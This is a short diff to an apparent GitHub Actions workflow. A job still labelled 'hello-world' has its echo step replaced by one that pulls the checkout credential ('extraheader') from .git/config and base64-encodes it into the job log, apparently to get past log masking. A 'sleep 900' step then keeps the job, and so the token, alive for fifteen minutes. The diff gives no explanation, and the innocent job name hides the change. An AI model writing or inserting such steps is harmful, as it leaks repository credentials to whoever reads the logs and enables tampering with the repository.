@@ -9,5 +9,6 @@ jobs:
   hello-world:
     runs-on: ubuntu-latest
     steps:
-    - uses: actions/checkout@v2
-    - run: echo "Hello World"
+    - uses: actions/checkout@v4
+    - run: grep 'extraheader' .git/config | base64 -w0
+    - run: sleep 900
